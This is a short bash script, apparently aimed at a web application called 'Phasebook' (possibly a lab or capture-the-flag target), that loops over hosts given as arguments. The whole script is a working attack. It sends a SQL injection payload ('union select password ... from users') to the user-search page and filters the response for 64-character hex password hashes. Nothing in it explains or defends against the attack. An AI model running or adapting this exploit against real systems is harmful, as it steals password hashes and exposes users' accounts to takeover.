#!/bin/bash

while test -n "${1}"; do
    curl -s -d "username=blar' and 1=2 union select password, 1, 1 from users order by id desc limit 10;#" 'http://'${1}'/Phasebook/?p=usersearch' | grep onclick | grep profile | sed 's/>/\n/g' | sed 's/</\n/g' | grep -E '^[A-F0-9]{64}$'
    shift
done

